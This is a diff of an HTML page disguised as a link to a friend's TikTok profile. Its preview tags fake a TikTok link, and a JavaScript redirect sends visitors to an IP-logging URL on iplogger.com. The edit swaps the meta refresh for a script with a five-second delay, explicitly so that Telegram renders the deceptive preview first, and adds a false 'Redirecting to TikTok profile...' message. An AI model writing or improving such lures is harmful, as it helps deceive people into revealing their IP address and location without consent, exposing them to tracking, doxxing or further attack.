@@ -4,23 +4,27 @@
   <meta charset="UTF-8">
   <title>Open this profile!</title>
 
-  <!-- Open Graph Meta Tags -->
-  <meta property="og:title" content="Open TikTok profile!1" />
-  <meta property="og:description" content="Visit this TikTok profile of your friend1" />
-  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1280px-TikTok_logo.svg.png" /> <!-- Change this -->
+  <!-- ✅ Put Open Graph first -->
+  <meta property="og:title" content="Open TikTok profile!" />
+  <meta property="og:description" content="Visit this TikTok profile of your friend" />
+  <meta property="og:image" content="https://yourdomain.com/tiktok-preview.jpg" />
   <meta property="og:url" content="https://tiktok.com/@someuser" />
   <meta property="og:type" content="website" />
 
-  <!-- Twitter Card Tags (Optional) -->
+  <!-- Optional Twitter fallback -->
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Open this TikTok profile!2" />
-  <meta name="twitter:description" content="Visit TikTok profile of your friend2" />
-  <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1280px-TikTok_logo.svg.png" />
+  <meta name="twitter:title" content="Open this TikTok profile!" />
+  <meta name="twitter:description" content="Visit TikTok profile of your friend" />
+  <meta name="twitter:image" content="https://yourdomain.com/tiktok-preview.jpg" />
 
-  <!-- Redirect to IPLogger link -->
-  <meta http-equiv="refresh" content="1;url=https://iplogger.com/23fcs5" />
+  <!-- ✅ Use JS redirect instead of meta refresh -->
+  <script>
+    setTimeout(() => {
+      window.location.href = "https://iplogger.com/23fcs5";
+    }, 5000); // delay 5s so Telegram can read the preview
+  </script>
 </head>
 <body>
-  <p></p>
+  <p>Redirecting to TikTok profile...</p>
 </body>
 </html>
